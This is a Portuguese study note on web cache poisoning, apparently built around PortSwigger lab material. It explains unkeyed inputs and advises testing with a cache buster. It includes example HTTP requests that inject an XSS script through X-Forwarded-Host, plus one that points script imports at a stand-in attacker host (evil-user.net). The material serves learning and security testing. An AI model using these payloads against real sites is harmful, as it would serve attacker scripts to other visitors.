#attack #attack/web #web

O web cache serve para diminuir a carga de trabalho de um servidor, reduzindo o número de requisições duplicadas ao salvar uma cópia de uma resposta no cache. Quando o cache recebe uma requisição HTTP, ele verifica se existe uma resposta que serve para essa requisição através da cache key, formada por componentes do header. Componentes do header que não são inclusos na key são chamados de **unkeyed**.

O web cache poisoning possui três passos:
1. Identificar unkeyed inputs
	1. A extensão **Param Miner** do Burp (BApp Store) automatiza isso mas é importante adicionar a opção para criar um *cache buster* a cada requisição para não prejudicar outros usuários ou o site.
2. Descobrir como obter uma resposta do backend com um payload crítico
3. Garantir que essa resposta seja armazenada em cache

**OBS:** habilitar o *cache buster* do ParamMiner evita da resposta ficar em cache, então após os testes desabilite o ParamMiner para conseguir o `X-Cache: Hit`.
## Explorando falhas de design

As falhas de design são relacionadas a deficiência no projeto de cache, por exemplo, a falta de mecanismos para validar a integridade do conteúdo armazenado em cache.

### [[XSS]]

Esse é a forma mais comum, quando um unkeyed input é refletida na resposta sem sanitização adequada. Por exemplo:

```
GET /en?region=uk HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: innocent-website.co.uk 

HTTP/1.1 200 OK 
Cache-Control: public 
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Neste caso o valor do `X-Forwarded-Host` é usado na url da resposta para gerar uma imagem. Colocando um script em seu lugar:

```
GET /en?region=uk HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: a."><script>alert(1)</script>" 

HTTP/1.1 200 OK 
Cache-Control: public 
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

Neste exemplo, todos usuários que entrar em region=uk vai cair nesse script.

### Importações de recursos inseguros

Semelhante a situação anterior, ao descobrir que `X-Forwarded-Host`  é uma **unkeyed input** um possível teste seria colocar o seu domínio com um js que ao ser importado pela página ele irá executar.

```
GET / HTTP/1.1 
Host: innocent-website.com 
X-Forwarded-Host: evil-user.net

HTTP/1.1 200 OK 
<script src="https://evil-user.net/static/analytics.js"></script>
```

Lab: [[Web cache poisoning - with an unkeyed header]]
### Cookie handling

Há situações que valores que estão no cookie não são usados no cache key, sendo alvo de web cache poisoning

Lab: [[Web cache poisoning - unkeyed cookie]]

### Header Vary

O cabeçalho `Vary` é útil para identificar o que é tratado como **cache key**. É comumente usado para especificar que o `User-Agent` é chaveado para que se a versão mobile de um site for armazenada em cache, isso não será enviado aos usuários da versão web. Ou seja, sabendo disso, um hacker pode adaptar o ataque para que apenas os usuários com esse agente seja afetado.
### [[DOM-Based]] 

Muitos websites usam JS acessar dados de maneira insegura e lançam no HTML.

Lab: [[Web cache poisoning - DOM-based]]

### Encadeando vulnerabilidades

As vezes o invasor só é capaz de provocar uma resposta maliciosa criando uma requisição com vários headers e o mesmo acontece com diferentes tipos de ataque.

Lab: [[Web cache poisoning - Combining vulnerabilities]]

## Explorando falhas de implementação

As falhas de implementação podem surgir de erros de codificação, configurações incorretas ou outras falhas técnicas.

### Unkeyed query string


## Referências
https://portswigger.net/web-security/web-cache-poisoning